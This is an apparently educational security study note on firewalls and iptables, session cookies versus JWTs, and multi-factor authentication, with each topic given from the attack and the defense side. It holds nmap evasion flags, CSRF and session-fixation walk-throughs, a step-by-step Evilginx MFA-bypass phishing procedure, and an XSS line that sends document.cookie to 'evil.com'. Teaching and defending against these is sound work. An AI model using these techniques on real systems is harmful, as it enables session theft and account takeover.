---
title: "1.6 Defensive Groundwork Masterclass"
aliases: ["Defensive Groundwork", "Firewalls", "Firewall", "iptables", "Cookie vs Token", "Session Management", "MFA", "2FA", "Multi-Factor Authentication"]
tags:
  - tree/defensive
  - cyber/defense/foundations
  - cyber/web/basics
  - type/concept
  - level/apprentice
Domain:
  - "[[Defensive Security]]"
Color: "#4363D8"
---

# 🛡️ 1.6 Defensive Groundwork Masterclass

> [!abstract] The Masterclass
> *"Know how it is defended so you know how to break it."* This chapter covers the three defensive pillars every attacker meets: **firewalls** (what traffic is even allowed), **session management** (how stateless HTTP fakes "logged in", and how that's stolen), and **MFA** (the extra factor — and how real attacks defeat it). Each is presented offense-and-defense. **`#level/apprentice` → `#difficulty/medium`**

> [!tip] Chapter Map
> **** · **** · ****

---

## Firewalls

A **firewall** is the chokepoint deciding which traffic passes, based on rules. It makes one of three decisions — **ACCEPT**, **DROP** (silent), or **REJECT** (notify) — matching on source/dest **IP**, **port**, **protocol**, interface, and direction. The critical design choice is the **default policy**: production hardening always prefers **default-deny** (whitelist).

On Linux, that rule-matching engine is **netfilter**, living in the kernel; `iptables`/`nftables` and the friendlier `ufw` are just front-ends that write rules into it. Knowing netfilter's actual packet path — which tables and chains a packet touches, and in what order — is what separates "I can paste an iptables tutorial" from "I can explain why this specific rule never fires."

```mermaid
flowchart TD
    A["📦 Packet"] --> B{"Existing connection?<br/>(stateful only)"}
    B -->|"ESTABLISHED/RELATED"| ALLOW["✅ Allow"]
    B -->|"NEW"| C{"Matches a rule?"}
    C -->|ACCEPT| ALLOW
    C -->|DROP/REJECT| DENY["❌ Deny"]
    C -->|"no match"| D{"Default policy"}
    D -->|"default-deny (best practice)"| DENY
```

#### Packet flow through netfilter: tables and chains

netfilter organises its logic into **tables** (what kind of change gets made) and **chains** (where in the packet's journey it happens). A packet doesn't hit "the firewall" once — it's evaluated by a specific *sequence* of chains depending on whether it's destined for this host or merely passing through:

```mermaid
flowchart LR
    IN["📥 NIC ingress"] --> PRE["PREROUTING<br/>(raw → conntrack → mangle → nat)"]
    PRE --> RD{"Routing decision:<br/>destined for this host?"}
    RD -->|"yes, local"| INPUT["INPUT<br/>(mangle → filter → security)"]
    INPUT --> LOCAL["🖥️ Local process<br/>(e.g. sshd, nginx)"]
    LOCAL --> OUTPUT["OUTPUT<br/>(raw → mangle → nat → filter)"]
    RD -->|"no, routed through"| FORWARD["FORWARD<br/>(mangle → filter → security)"]
    FORWARD --> POST["POSTROUTING<br/>(mangle → nat)"]
    OUTPUT --> POST
    POST --> OUT["📤 NIC egress"]
```

| Table | Purpose | Typical use |
| --- | --- | --- |
| **raw** | Bypasses connection tracking | Rare — high-throughput paths where conntrack overhead isn't wanted |
| **mangle** | Alters packet headers (TTL, TOS/DSCP, marks) | QoS, policy-based routing |
| **nat** | Rewrites source/destination addresses | Port forwarding (**DNAT**), masquerading (**SNAT**) |
| **filter** | The actual ACCEPT/DROP/REJECT verdict | Everything in the ruleset below |

**Why it matters:** an endpoint (web server, workstation) mainly lives in **INPUT**/**OUTPUT**. A router, VPN gateway, or pivot host cares about **FORWARD** instead — traffic passes *through* it without being "for" it. Attackers on a multi-homed box specifically hunt for permissive **FORWARD** rules: that's the gap between "I have a shell" and "I have a route into the internal network."

**Gotcha:** rule *order* inside a chain is everything — first match wins, evaluation stops. Rules appended with `-A` go to the bottom, so a broad `DROP` added early can shadow a specific `ACCEPT` added later. When a rule "isn't working," check `iptables -L -v -n --line-numbers` first — the counters show exactly which line is actually being hit.

### Types, from dumb to smart

| Type | OSI | State? | Content? | Use |
| --- | --- | --- | --- | --- |
| **Stateless** | 3–4 | No | No | High-speed edge ACLs |
| **Stateful** | 3–4 | Yes | No | Standard host/net firewall (`iptables`, `pf`) |
| **Proxy / App Gateway** | 7 | Yes | Yes | Content filtering, internal-IP masking |
| **NGFW** | 3–7 | Yes | Yes (+TLS decrypt) | Enterprise perimeter, IPS, threat intel |

**Why it works, row by row:** *stateless* judges each packet alone — cheap and fast, but with no memory it must open standing holes for return traffic (concrete example below). *Stateful* keeps a `conntrack` table and only needs to remember "did we see the outbound half," so everything else stays closed. A *proxy/application gateway* terminates the client's connection and opens a fresh one to the real destination — it can inspect and rewrite content and hide the internal IP, at the cost of latency and a single point of failure. An **NGFW** adds **TLS interception** on top: a trusted internal CA decrypts, inspects, and re-encrypts traffic — powerful, but it breaks certificate pinning and turns the inspection point itself into a high-value target.

**In the wild:** most home routers are simple stateful NAT boxes. Enterprises stack several types — NGFW at the perimeter, host-based `iptables`/Windows Defender Firewall on every box, a layer-7 WAF in front of the web app — so no single bypass gets an attacker all the way through: **defense in depth**, and why one `nmap` finding rarely means "game over" alone.

### Practical: iptables & ufw
```bash
# --- Default-deny host firewall (iptables / netfilter) ---
sudo iptables -P INPUT DROP      # 1. default policy: deny unless explicitly allowed
sudo iptables -P FORWARD DROP    # 2. this host doesn't route traffic for others
sudo iptables -P OUTPUT ACCEPT   # 3. trust what the host itself initiates

sudo iptables -A INPUT -i lo -j ACCEPT                                                # 4. loopback is always safe
sudo iptables -A INPUT -m conntrack --ctstate INVALID -j DROP                         # 5. malformed/out-of-state packets
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT           # 6. stateful return traffic
sudo iptables -A INPUT -p tcp -s 10.10.10.0/24 --dport 22 -j ACCEPT                    # 7. SSH, scoped to admin subnet
sudo iptables -A INPUT -p tcp -m conntrack --ctstate NEW -m limit --limit 4/min --dport 22 -j ACCEPT  # 7b. rate-limit new SSH
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT                                    # 8. public HTTPS
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT # 9. rate-limited ping
sudo iptables -A INPUT -j LOG --log-prefix "DROP: " --log-level 4                      # 10. log before the final drop
sudo iptables -A INPUT -j DROP                                                          # 11. explicit catch-all

# --- ufw (friendly front-end over the same netfilter engine) ---
sudo ufw default deny incoming                                # ≈ rule 1
sudo ufw default allow outgoing                               # ≈ rule 3
sudo ufw allow from 10.10.10.0/24 to any port 22 proto tcp    # ≈ rule 7
sudo ufw limit ssh                                            # ≈ rule 7b — built-in brute-force throttle
sudo ufw allow 443/tcp                                        # ≈ rule 8
sudo ufw logging on                                           # ≈ rule 10
sudo ufw enable
```

**Rule-by-rule, why each line earns its place:**

| # | Rule | Why |
| --- | --- | --- |
| 1–3 | Default policies | Nothing enters unless a later rule explicitly ACCEPTs it; OUTPUT stays open because we trust the box, not the network reaching it |
| 4 | `-i lo -j ACCEPT` | Loopback traffic is a process talking to itself — blocking it silently breaks local services |
| 5 | Drop `INVALID` state | Malformed flags, out-of-sequence segments — conntrack can't classify them, so refuse outright |
| 6 | Accept `ESTABLISHED,RELATED` | The stateful shortcut: return traffic for connections *we* started skips full re-evaluation — the line that makes default-deny livable |
| 7 | Scoped SSH | Least privilege — management traffic only from the admin VLAN |
| 7b | Rate-limited SSH | Slows credential-stuffing against port 22 without needing `fail2ban` for the basic case |
| 8 | Public HTTPS | The one port actually meant to face the internet |
| 9 | Rate-limited ICMP | Keeps `ping` usable without enabling ICMP flood DoS |
| 10 | Log before drop | Without this, every scan/attack attempt vanishes with zero trail |
| 11 | Explicit final `DROP` | Redundant with the default policy, but gets its own counter in `iptables -L -v` — what you actually watch during an incident |

**Gotcha worth internalising:** `OUTPUT ACCEPT` by default means a *compromised* host can still call out to a C2 server even with a flawless INPUT policy — a perfect inbound firewall says nothing about exfiltration. High-security zones flip `OUTPUT` to default-deny too, with an explicit allow-list of legitimate destinations — more upkeep, but it turns "attacker got a shell" into "attacker got a shell that can't phone home."

`ufw status verbose` prints the generated iptables rules — `ufw` doesn't replace netfilter, it templates it. `ufw limit ssh` is a convenience wrapper: after roughly six attempts from one IP within 30 seconds it auto-drops, no manual `hashlimit` module required.

#### Stateful vs. stateless: a concrete example

Say a client behind the firewall opens an outbound HTTPS connection (recall the **three-way handshake**): `192.168.1.50:51342 → 93.184.216.34:443`. The reply must arrive as `93.184.216.34:443 → 192.168.1.50:51342` — source and destination flipped, same **ephemeral port**.

- **Stateless firewall:** judges every packet alone, with no memory of the outbound request. To let the reply back in, an admin must permit *any* inbound packet claiming source port 443 into the *entire* ephemeral range (49152–65535) — a standing hole any external host can walk through by setting its own source port to 443.
- **Stateful firewall:** `conntrack` recorded the outbound SYN, so it expects exactly one specific return 4-tuple. Anything else — even something claiming to be "from port 443" — that doesn't match that tracked connection is `NEW` or `INVALID` and falls to the default-deny policy.

```
$ conntrack -L
tcp 6 431999 ESTABLISHED src=192.168.1.50 dst=93.184.216.34 sport=51342 dport=443 \
    src=93.184.216.34 dst=192.168.1.50 sport=443 dport=51342 [ASSURED]
```
Reading it: protocol, remaining timeout (s), state, the *forward* tuple, the *expected reply* tuple, and `[ASSURED]` — traffic seen in both directions, so the entry won't be evicted early under table pressure.

```mermaid
flowchart TD
    subgraph Stateless["Stateless ACL"]
        S1["Rule: allow src port 443<br/>to ANY dst port 49152-65535"] --> S2["🕳️ Standing hole:<br/>anything claiming src :443 gets in"]
    end
    subgraph Stateful["Stateful (conntrack)"]
        T1["Outbound SYN recorded:<br/>192.168.1.50:51342 → 93.184.216.34:443"] --> T2["Only THAT exact<br/>return 4-tuple is ESTABLISHED"]
        T2 --> T3["Everything else: NEW or INVALID<br/>→ hits default-deny"]
    end
```

**Trade-off, not a free lunch:** a `conntrack` table is finite memory — enough half-open connections fast enough can exhaust it (a stateful-flavoured SYN flood), where a stateless device has no such table to exhaust. That's why very high-throughput backbone ACLs still run stateless, leaning on a stateful device closer to the host to close the holes they leave open.

### Offensive angle — mapping & evading
```bash
nmap -sA target              # ACK scan — reveals a stateful firewall (filtered vs not)
nmap -f target                # fragment probes past naive inspection
nmap -D RND:10 target         # decoy scan — hide the real source
nmap --source-port 53 target  # spoof a whitelisted source port
nmap -sN target                # Null scan — no flags at all
nmap -Pn target                 # skip host discovery entirely
```

Firewalls change nmap's job from "is this port open" to "what sits between me and the port, and can I still get a truthful answer anyway." Each flag targets a specific weakness in *how* the filtering device decides:

| Flag | Technique | Why it works | Defense |
| --- | --- | --- | --- |
| `-sA` (ACK scan) | Sends a bare ACK, never completes a handshake | A **stateless** ACL lets it through (RST back → `unfiltered`); a **stateful** device drops it, no matching conntrack entry → `filtered`. Fingerprints stateful vs. stateless before touching a real port | Stateful inspection everywhere; never trust an ACK-only ACL |
| `-f` (fragment) | Splits the TCP header across tiny IP fragments | Naive filters inspect only the first fragment's header, pass the rest unexamined | Reassemble before inspecting — most modern stateful firewalls/NGFWs do this by default |
| `-D RND:10` (decoy) | Spoofs 10 random source IPs alongside the real one | Logs fill with noise; without upstream visibility the defender can't isolate the real source | Ingress filtering (BCP 38); correlate against completed handshakes — decoys can't finish one, since replies go to the spoofed IP |
| `--source-port 53` | Sets the scanner's source port to 53 (DNS) | Some ACLs whitelist "replies from DNS/HTTP" by source port alone — the stateless "hole" from the example above | Never treat source port as identity; match on tracked state, not one header field |
| `-sN`/`-sF`/`-sX` (Null/Fin/Xmas) | No flags / only FIN / FIN+PSH+URG — never a SYN | RFC 793: a closed port RSTs, an open one stays silent; filters that only recognise SYN as "new" ignore these entirely | Stateful firewalls drop anything that isn't a valid state transition |
| `-Pn` | Skips ping-based discovery, assumes every target is up | Defeats firewalls that DROP ICMP, which would otherwise make nmap report a live host as "down" | Doesn't stop the scan — the lesson is ICMP-blocking is a recon speed bump, not a control |

See **Nmap Port Scans** for the full technique reference this table draws from.

**Beginner → Expert:** an attacker runs `-sA` against the perimeter and finds port 8080 comes back *unfiltered* rather than *filtered* — the tell that the ACL is stateless and trusts something other than connection state. `--source-port 53` then lands them on an internal admin panel "protected" only by a rule assuming DNS-looking replies are safe: default creds, a shell, a pivot deeper in. **Defense:** replace the stateless ACL with a stateful device or NGFW, and treat any rule matching on port number alone as a finding, not a control.

A firewall reduces *exposure*, not vulnerability — it never replaces patching. See **Networking (Nmap (Network Mapper))**.

Firewalls decide whether a packet reaches the application at all. The next chokepoint sits *inside* that application: proving a request came from someone who already logged in.

---

## Sessions (Cookies vs Tokens)

**HTTP** has no memory — apps fake "logged in" two ways: **session cookies** (server holds state, browser auto-attaches an opaque ID) or **tokens/JWT** (client holds a signed token, JS attaches it manually). Each trades one attack surface for another. Both solve the same problem — persisting identity across many stateless requests — but they place trust in different places, and attackers have spent two decades mapping exactly where each one bends.

```mermaid
sequenceDiagram
    participant B as Browser
    participant S as Server
    B->>S: POST /login
    S-->>B: Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
    Note over B: browser auto-attaches on every request
    B->>S: GET /account (Cookie: session=abc)
    S-->>B: 200 OK
```

| | Cookies | Tokens (JWT) |
| --- | --- | --- |
| Attachment | Automatic (browser) | Manual (JS header) |
| CSRF | Vulnerable | Largely immune |
| XSS | Lower if `HttpOnly` | Higher if in `localStorage` |
| Revocation | Instant (delete record) | Hard (valid until expiry) |
| Scaling | Domain-locked | Stateless, decentralised |

A **JWT** is `header.payload.signature` — Base64URL **encoded, not encrypted**; anyone can read it (`base64 -d`), so never put secrets in the payload. Full JWT attacks (`alg:none`, key confusion) in **JWT Security**.

#### The full cookie lifecycle

1. `POST /login` sends credentials over TLS.
2. The server verifies them and creates a **session record** server-side (Redis, a database, memory) keyed by a cryptographically random ID.
3. `Set-Cookie` hands the browser *only that opaque ID*, never the session data itself.
4. The cookie jar stores it, scoped by `Domain`/`Path`, and auto-attaches it to every matching request — no JavaScript involved. That automatic attachment is exactly what makes CSRF possible, below.
5. Every request becomes an O(1) lookup: ID → session record → identity and permissions.
6. Logout, or `Max-Age`/`Expires` running out, deletes the server-side record — invalidating the ID *everywhere, instantly*. This is the "instant revocation" row above, and cookies' biggest operational edge over tokens.

#### The full JWT lifecycle

```mermaid
sequenceDiagram
    participant B as Browser/App
    participant S as Auth Server
    participant R as Resource API
    B->>S: POST /login (credentials)
    S-->>B: { accessToken (JWT, ~15 min), refreshToken }
    Note over B: JS stores tokens (memory / localStorage / sessionStorage)
    B->>R: GET /api/data<br/>Authorization: Bearer accessToken
    R->>R: Verify signature + exp locally (no DB lookup — stateless)
    R-->>B: 200 OK
    Note over B,S: accessToken expires
    B->>S: POST /refresh (refreshToken, HttpOnly cookie)
    S-->>B: new accessToken
```

Nothing here is automatic — client-side JS must read the token and set `Authorization: Bearer <token>` on every call itself. That's why JWTs are largely CSRF-immune (a malicious page can't make the browser "auto-know" a token it was never given) but more exposed to XSS if stored in `localStorage`, since no `HttpOnly`-equivalent exists for storage APIs. **Gotcha:** stashing a JWT in `localStorage` "for convenience" quietly reintroduces the exact exposure `HttpOnly` cookies exist to prevent — the single most common real-world JWT misconfiguration. The fix: short-lived access tokens, rotated via a longer-lived, `HttpOnly` refresh token.

#### JWT anatomy, decoded

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDcyIiwiaXNzIjoiYXBpLmV4YW1wbGUuY29tIiwiaWF0IjoxNzUzMDAwMDAwLCJleHAiOjE3NTMwMDM2MDAsInJvbGUiOiJhZG1pbiJ9.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
```

Three dot-separated, Base64URL-encoded segments — `base64 -d` on the first two reveals plain JSON:

```json
// header
{ "alg": "HS256", "typ": "JWT" }
```
```json
// payload
{ "sub": "1072", "iss": "api.example.com", "iat": 1753000000, "exp": 1753003600, "role": "admin" }
```

| Claim | Meaning |
| --- | --- |
| `alg` | Signing algorithm — the attacker's first target (`alg:none`, HS256/RS256 confusion) |
| `sub` | Subject — the user/entity the token represents |
| `iss` | Issuer — who minted the token |
| `iat` / `nbf` / `exp` | Issued-at / not-before / expiry — the *only* built-in revocation mechanism a JWT has |
| `aud` | Audience — which API this token is meant for |
| Custom claims (`role`, etc.) | Whatever the issuer wants — **never authorize purely on a claim without re-verifying it server-side** |

Signature: `HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)` for HS256, or an RSA/ECDSA private-key signature for RS256/ES256 — no encryption anywhere, only integrity. The full attack catalogue built on this structure (`alg:none`, key confusion, weak-secret brute force, `kid` injection) lives in **JWT Security**.

### Cookie security flags
| Flag | Defends against |
| --- | --- |
| **`HttpOnly`** | **XSS** cookie theft (JS can't read it) |
| **`Secure`** | Network sniffing (HTTPS only) |
| **`SameSite=Strict/Lax`** | CSRF |
| **`Domain` / `Path`** (scoped narrowly) | Leaking to sibling subdomains or unrelated paths |
| **`Max-Age` / `Expires`** | A stolen cookie remaining valid indefinitely |
| **`__Host-` prefix** | Browser-enforced `Secure` + no `Domain` + `Path=/` — a subdomain can't override it |
| **`__Secure-` prefix** | Browser refuses to set the cookie at all over plain HTTP |

#### Attack walk-through: session fixation

1. The attacker obtains, or simply picks, a valid-looking session ID — some apps accept one supplied via a URL parameter or a pre-set cookie even before login.
2. They send the victim a link carrying that fixed ID, or plant it via a cookie-setting XSS on a sibling subdomain.
3. The victim logs in normally — the app authenticates the *browser*, but never rotates the session identifier.
4. Because the ID was fixed beforehand, the attacker's own copy of `session=fix123` is now a fully authenticated session too.
5. The attacker replays that cookie — no password, no MFA prompt, just a walk in the front door.

**Defense:** always regenerate the session ID on every privilege change — login, logout, escalation. Most frameworks (`express-session`, Django, Rails) do this automatically; the flaw tends to appear in hand-rolled auth code that reuses an ID across the login boundary instead of minting a fresh one.

#### Attack walk-through: CSRF

1. The victim is logged into `bank.com` — a valid session cookie, no `SameSite` protection set.
2. They visit an attacker-controlled page containing a hidden auto-submitting form (or, for a naive GET-based action, `<img src="https://bank.com/transfer?to=attacker&amount=500">`).
3. The browser attaches the `bank.com` cookie regardless — cookies ride along **per-domain**, not per-origin-of-the-request.
4. `bank.com` sees a well-formed, authenticated-looking request and executes it — it has no built-in way to tell the request didn't originate from its own UI.

**Defense:** `SameSite=Strict`/`Lax` (stops the cookie riding along cross-site at all), synchronizer anti-CSRF tokens (a per-session secret the attacker's page can't read or guess), the double-submit cookie pattern, and checking `Origin`/`Referer` server-side as defense-in-depth.

**Offense — the third vector, XSS cookie theft:** an attacker finds an injection point that reflects or stores unsanitised input (see **XSS Payload List**); the payload runs *inside the victim's own authenticated browser*: `fetch('https://evil.com/log?c=' + document.cookie)`. Without `HttpOnly`, `document.cookie` hands the session ID over directly — paste it into another browser (Burp Suite makes replay trivial) and you're instantly logged in as the victim, no password required. **Defense:** all three flags from the table above, session-ID rotation on login, short-lived JWTs with `HttpOnly` refresh tokens, and a strict Content-Security-Policy so even a successful injection can't beacon data out to `evil.com`. This whole topic lives under **7.  Identification and Authentication Failures**.

Every attack above assumes the attacker never touched the password — cookies and tokens get stolen *after* authentication succeeds. MFA is the layer meant to make that initial step itself resistant to being faked or replayed — though "resistant" comes in very different grades.

---

## Multi-Factor Authentication

**MFA** requires **two or more** independent proofs, so a stolen password alone isn't enough. **2FA** is exactly two factors (all 2FA is MFA, not vice-versa). The theory: compromising one factor shouldn't compromise the account. The practice, as this section shows, is that "independent" is doing a lot of work — two factors funnelled through the same phishing page aren't independent at all.

| Factor | Example |
| --- | --- |
| **Know** | password, PIN |
| **Have** | phone app, hardware token, smart card |
| **Are** | fingerprint, face (never 100% — supplement only) |
| **Somewhere** | IP / geolocation |
| **Do** | typing/mouse behaviour |

#### The five factors, deepened

- **Know:** a shared secret checked at auth time. Weak because it's reusable if intercepted or breached elsewhere (credential stuffing), and phishable by definition — the human has to type it somewhere.
- **Have:** a TOTP app, hardware token, or smart card — proof of physical control at login. Can be lost, stolen, or (phone-based) SIM-swap-cloned; the strongest implementations bind a secret that never leaves the device, the whole idea behind hardware-backed keys.
- **Are:** fingerprint, face, iris — a stored template matched to a live scan. **Never 100% accurate**, and **not revocable**: you can't "reset" a fingerprint after a breach (see the 2019 Suprema leak). Usually the biometric never leaves the device either — it just unlocks a locally stored key, so an attacker only needs to bypass the prompt or extract that key, not steal the biometric itself.
- **Somewhere:** IP geolocation, GPS, network context — a risk signal for adaptive auth, stepping up requirements when location looks anomalous. Trivially spoofed by a VPN, so it's never a standalone factor.
- **Do:** typing cadence, mouse movement, gait — continuous passive verification through the session rather than a one-time check. Immature and false-positive-prone, so it's mostly silent fraud-scoring today, not a hard gate.

**2FA methods** (strongest → weakest): **hardware tokens (FIDO2)** > **TOTP** (30s codes) > **push** (vulnerable to **MFA fatigue** — the Uber breach) > **SMS** (SIM-swap/intercept).

#### Threat model per 2FA method

| Method | Mechanism | Primary threat | Mitigation |
| --- | --- | --- | --- |
| **Hardware token (FIDO2/U2F)** | Public-key challenge-response, bound to the site's origin | Physical theft of the token (still needs the password too) | PIN-protected tokens, revocation lists |
| **TOTP** (authenticator app) | Shared secret + time → rotating 30s code | **Real-time phishing relay** (Evilginx, below); seed theft at enrollment (a screenshotted QR code) | Short validity window, rate-limit attempts, migrate high-value accounts to FIDO2 |
| **Push notification** | App shows "Approve/Deny" on a registered device | **MFA fatigue / push bombing** (below); "approve" as muscle memory | Number-matching (type a code from the login screen into the app), show location/context in the prompt |
| **SMS OTP** | Code delivered over the cellular network | **SIM-swap**, **SS7 interception**, malware reading SMS on a compromised phone | Migrate to app-based or hardware MFA — NIST has deprecated SMS as a sole factor |

**Pitfall:** systems that let a user "fall back" to a weaker factor (SMS) whenever a hardware key isn't available. Attackers specifically request that fallback, since it quietly downgrades a phishing-resistant account to an SS7/SIM-swap-able one.

### Bypassing MFA with Evilginx
A man-in-the-middle proxy relays the login in real time, capturing username, password, **and OTP**, then steals the **session cookie** — access *without cracking MFA*. Step by step:

1. The attacker registers a lookalike domain (e.g. `login-microsft-online.com`) on a VPS running **evilginx2**, configured with a **phishlet** — a template reproducing the real login flow's exact HTML/JS/cookie structure for the target service.
2. Evilginx gets a valid TLS cert for that domain (Let's Encrypt) — the padlock looks completely normal.
3. The victim receives a phishing email or SMS with the link and clicks through.
4. Evilginx acts as a **reverse proxy**: every request is transparently relayed to the *real* site, every response rewritten (domains swapped) before returning — the victim is, for all practical purposes, using the real site through a man in the middle.
5. The victim types username, password, and — when prompted — their TOTP/SMS code, all transiting *through* evilginx before reaching the real server.
6. The real server, having received a fully valid password and OTP, authenticates and issues a real `Set-Cookie` — exactly as for a legitimate login.
7. Evilginx captures that `Set-Cookie` in its own session log *before* relaying it on to the victim.
8. The attacker opens evilginx's `sessions` view and imports the captured cookie into their own browser (cookie-editor extension, `curl -b`, or Burp Suite).
9. The attacker is now sitting in a fully authenticated session. **MFA already succeeded** — from the real site's point of view, back at step 6. Nothing was cracked; the session itself was stolen after the fact.

```mermaid
flowchart LR
    V["🧑 Victim"] -->|creds + OTP| E["Evilginx (MITM)"]
    E -->|relay| R["🏦 Real site"]
    R -->|session cookie| E
    E -->|"🍪 stolen cookie"| A["😈 Attacker logged in"]
    style A fill:#3a1a1a,stroke:#ff6b6b,color:#ffe3e3
```

This is why **phishing-resistant MFA (FIDO2/WebAuthn)** matters — it binds the credential to the real domain, so a proxy can't relay it.

#### Phishing-resistant MFA: FIDO2/WebAuthn

At registration, the authenticator — a hardware key, or a phone's secure enclave acting as a platform authenticator — generates a public/private key pair **unique to that site's origin**; the private key never leaves the device. At login, the server sends a random challenge, and the authenticator signs it *together with the origin the browser tells it it's talking to*, then the server checks the signature against the stored public key **and** confirms the origin matches:

```mermaid
sequenceDiagram
    participant V as Victim (on evilginx lookalike)
    participant Auth as Authenticator (YubiKey / Passkey)
    participant R as Real Site
    R-->>V: Challenge (random nonce)
    Note over V,Auth: Browser reports the ACTUAL origin: evil-lookalike.com
    V->>Auth: Sign(challenge + origin)
    Auth-->>V: Signature bound to evil-lookalike.com
    V->>R: Forwarded signature
    R->>R: Verify signature against expected origin "real-site.com"
    R-->>V: ❌ Mismatch — rejected, MITM proxy defeated
```

Because evilginx's lookalike domain is a genuinely different origin, the browser reports the *wrong* origin to the authenticator, the signature comes back bound to that wrong domain, and verification fails — the relay collapses at this one step, no matter how convincing the phishing page looks. That's the structural difference from OTP-based MFA: an OTP is just data a human copies from one place to another, so a proxy can copy it too; a WebAuthn signature is computed by the authenticator itself, bound to a channel property the human never even sees.

#### MFA fatigue (push-bombing)

```mermaid
flowchart TD
    C["😈 Attacker has stolen password"] --> P1["Push prompt #1"] --> D1["❌ Victim denies"]
    D1 --> P2["Push prompt #2, #3, #4… (often at night)"]
    P2 --> SE["📞 Optional: fake 'IT support' call/message"]
    SE --> TAP["😩 Victim taps Approve<br/>(fatigue, confusion, social pressure)"]
    TAP --> ACC["🔓 Attacker fully authenticated"]
    style ACC fill:#3a1a1a,stroke:#ff6b6b,color:#ffe3e3
```

The attacker already holds a valid stolen password — a prior breach, an infostealer log — for an account behind push-based MFA. Rather than attacking the second factor cryptographically, they trigger the push prompt over and over, often at inconvenient hours, hoping the victim eventually taps "Approve" out of alarm-fatigue or confusion — sometimes paired with a fake "IT support" call or message. **Case study:** the 2022 Uber breach, attributed to Lapsus$, followed exactly this pattern — bombarding an employee with push requests plus a WhatsApp message claiming to be IT, until one prompt got approved.

**Defense:** **number matching** (the app must show a number the user types into the login screen, making blind-approval impossible), rate-limiting/backoff on repeated prompts, alerting on multiple consecutive denials, and training staff that an unexpected MFA prompt means *someone else has your password*, not a glitch.

Common MFA flaws worth auditing for directly:

| Flaw | What goes wrong |
| --- | --- |
| Weak OTP generation | Short or predictable codes from poor RNG — brute-forceable |
| Token leakage in responses | OTP/reset token echoed in an API response body or URL, then logged by proxies or analytics |
| No rate limiting | Unlimited OTP attempts reduce "MFA" to a four-to-six-digit password |
| Insecurely stored backup codes | Plaintext recovery codes in a file or email bypass MFA entirely if found |

See **2. Broken User Authentication (BUA)** and **Phishing Tools**.

---

## Summary

You should now be able to:

- Configure a default-deny host firewall and explain the netfilter model beneath both iptables and ufw.
- Distinguish cookie-based and token-based sessions, and reason about the attack surface each exposes.
- Explain how multi-factor authentication factors compose, and why the recovery path is usually the weakest link.

## 🔗 Related Master Notes & Deep-Dives
- **1.1 Networking** — the traffic firewalls filter & the HTTP sessions run over
- **1.3 Windows and OS Internals** — where MFA protects AD/VPN access
- **JWT Security** · **Authentication Bypass** · **2. Broken User Authentication (BUA)** — Phase 2 deep-dives
- **Phishing** · **Phishing Tools** — how credentials & OTPs get harvested
- **Nmap Port Scans** · **Burp Suite** — the tooling behind firewall mapping and session/cookie replay
- [[Defensive Security]] — domain hub
